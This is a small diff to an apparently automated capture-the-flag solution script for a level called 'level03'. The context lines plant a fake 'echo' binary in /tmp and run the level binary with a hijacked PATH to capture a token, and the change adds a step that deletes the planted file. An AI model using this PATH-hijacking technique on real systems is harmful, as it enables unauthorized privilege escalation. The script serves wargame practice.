@@ -30,6 +30,8 @@ exec(client, 'chmod +x /tmp/echo', title='Make it executable')
 token_raw = exec(client, 'PATH=/tmp/:$PATH  ./level03', title='Tricky path replacement')[0]
 print_title('We done, binary execute our echo file and we avoid restriction')
 
+exec(client, 'rm -f /tmp/echo', title='Remove tmp file')
+
 token = sanitize_token(token_raw)
 save_token(token)
 
